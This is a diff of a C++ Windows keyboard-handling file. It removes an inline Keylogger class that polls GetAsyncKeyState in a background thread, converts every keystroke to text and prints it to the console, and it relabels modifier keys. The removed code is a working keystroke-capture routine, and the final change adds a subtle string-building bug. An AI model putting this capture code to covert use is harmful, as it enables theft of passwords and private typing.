@@ -1,136 +1,23 @@
 #pragma once
 #include <iostream>
-#include "keyboard.h"
+#include "keylogger.h"
 
-
-Key::Key(BYTE value, std::string description)
-	: value(value)
-	, description(std::string(description))
-	, state(0)
-	, alternating(false) {}
-
-bool Key::isPressed() {
-	return (state & PRESSED);
-}
-bool Key::isTriggered() {
-	bool triggered = isPressed() && alternating;
-	alternating = false;
-	return triggered;
-}
-bool Key::isToggled() {
-	return (GetKeyState(value) & TOGGLED);
-}
+#define CaseReturnString(CASE, STRING) case (CASE): return std::string(STRING)
 
 Keyboard::Keyboard()
 	: keys((Key**)malloc(sizeof(Key* [255])))
 	, polling(1)
 	, keylogger(new Keylogger(this)) {
-
-	for (BYTE i = 0; i < 255; i++) {
-		keys[i] = new Key(i, describeKey(i));
+	if (keys) {
+		for (BYTE i = 0; i < 255; i++) {
+			keys[i] = new Key(i, describeKey(i));
+		}
 	}
 }
 
 Key** Keyboard::getKeys() const {
 	return keys;
 }
-
-Keylogger::Keylogger(Keyboard* keyboard) : keyboard(keyboard), keylog(nullptr) {}
-
-void Keylogger::setKeysState() {
-	for (BYTE i = 0; i < 255; i++) {
-		Key* curkey = keyboard->keys[i];
-
-		bool oldpressed = curkey->isPressed();
-		curkey->state = GetAsyncKeyState(i);
-		bool curpressed = curkey->isPressed();
-
-		if (oldpressed != curpressed) {
-			curkey->alternating = true;
-		}
-	}
-}
-
-bool Keylogger::isKeylogging() const {
-	return keylog != nullptr;
-}
-
-void Keylogger::startKeylog() {
-	auto listener = [this]() {
-		while (isKeylogging()) {
-			setKeysState();
-			getOutput();
-		}
-		sleep(keyboard->polling);
-	};
-	keylog = new std::thread(listener);
-}
-void Keylogger::stopKeylog() {
-	std::thread* tempThread = keylog;
-	keylog = nullptr;
-	tempThread->join();
-	delete tempThread;
-}
-
-void Keylogger::getOutput() {
-	Key** keys = keyboard->getKeys();
-	bool caps = keys[VK_CAPITAL]->isToggled();
-	bool shift = keys[VK_SHIFT]->isPressed();
-
-	bool upper = caps != shift;
-
-	for (BYTE i = 0; i < 255; i++) {
-		Key& key = *keys[i];
-		if (!key.isTriggered() ||
-			key.value == VK_RSHIFT || key.value == VK_LSHIFT||
-			key.value == VK_RCONTROL || key.value == VK_LCONTROL || 
-			key.value == VK_RMENU || key.value == VK_LMENU) {
-			continue;
-		}
-		if (key.value >= 'A' && key.value <= 'Z') {
-			handleOutput((char)(key.value + (upper ? 0 : CHARTOLOWER)));
-			continue;
-		}
-		if (shift == true) {
-			switch (key.value) {
-				case('1'): handleOutput('!'); break;
-				case('2'): handleOutput('@'); break;
-				case('3'): handleOutput('#'); break;
-				case('4'): handleOutput('$'); break;
-				case('5'): handleOutput('%'); break;
-				case('6'): handleOutput('^'); break;
-				case('7'): handleOutput('&'); break;
-				case('8'): handleOutput('*'); break;
-				case('9'): handleOutput('('); break;
-				case('0'): handleOutput(')'); break;
-				case(VK_OEM_1): handleOutput(':'); break;
-				case(VK_OEM_2): handleOutput('?'); break;
-				case(VK_OEM_3): handleOutput('`'); break;
-				case(VK_OEM_4): handleOutput('{'); break;
-				case(VK_OEM_5): handleOutput('|'); break;
-				case(VK_OEM_6): handleOutput('}'); break;
-				case(VK_OEM_7): handleOutput('"'); break;
-				case(VK_OEM_COMMA): handleOutput('<'); break;
-				case(VK_OEM_PERIOD): handleOutput('>'); break;
-				case(VK_OEM_MINUS): handleOutput('_'); break;
-				case(VK_OEM_PLUS): handleOutput('+'); break;
-			}
-			continue;
-		}
-		handleOutput(key.description);
-	}
-}
-void Keylogger::handleOutput(char output) {
-	showOutput(output);
-}
-void Keylogger::handleOutput(std::string output) {
-	showOutput(output);
-}
-template<typename T> void Keylogger::showOutput(T output) {
-	std::cout << output;
-}
-
-#define CaseReturnString(CASE, STRING) case (CASE): return std::string(STRING)
 
 std::string Keyboard::describeKey(BYTE vk) {
 	switch (vk) {
@@ -140,8 +27,8 @@ std::string Keyboard::describeKey(BYTE vk) {
 		CaseReturnString(VK_BACK, "[BACKSPACE]");
 		CaseReturnString(VK_TAB, "[TAB]");
 		CaseReturnString(VK_RETURN, "[RETURN]");
-		CaseReturnString(VK_SHIFT, "[SHIFT]");
-		CaseReturnString(VK_CONTROL, "[CTRL]");
+		//CaseReturnString(VK_SHIFT, "[SHIFT]");
+		//CaseReturnString(VK_CONTROL, "[CTRL]");
 		CaseReturnString(VK_MENU, "[ALT]");
 		CaseReturnString(VK_PAUSE, "[PAUSE]");
 		CaseReturnString(VK_CAPITAL, "[CAPS LK]");
@@ -201,12 +88,12 @@ std::string Keyboard::describeKey(BYTE vk) {
 		CaseReturnString(VK_F24, "[F24]");
 		CaseReturnString(VK_NUMLOCK, "[NUM LK]");
 		CaseReturnString(VK_SCROLL, "[SCR LK]");
-		CaseReturnString(VK_LSHIFT, "");
-		CaseReturnString(VK_RSHIFT, "");
-		CaseReturnString(VK_LCONTROL, "");
-		CaseReturnString(VK_RCONTROL, "");
-		CaseReturnString(VK_LMENU, "");
-		CaseReturnString(VK_RMENU, "");
+		CaseReturnString(VK_LSHIFT, "[LSHIFT]");
+		CaseReturnString(VK_RSHIFT, "[RSHIFT]");
+		CaseReturnString(VK_LCONTROL, "[LCTRL]");
+		CaseReturnString(VK_RCONTROL, "[RCTRL]");
+		CaseReturnString(VK_LMENU, "[LALT]");
+		CaseReturnString(VK_RMENU, "[RALT]");
 		CaseReturnString(VK_OEM_1, ";");
 		CaseReturnString(VK_OEM_2, "/");
 		CaseReturnString(VK_OEM_3, "~");
@@ -223,5 +110,5 @@ std::string Keyboard::describeKey(BYTE vk) {
 	if ((vk >= 'A' && vk <= 'Z') || (vk >= '0' && vk <= '9')) {
 		return std::string(1, (char)vk);
 	}
-	return std::string("[UNDEFINED KEY]");
+	return std::string("[" + vk + ']');
 }
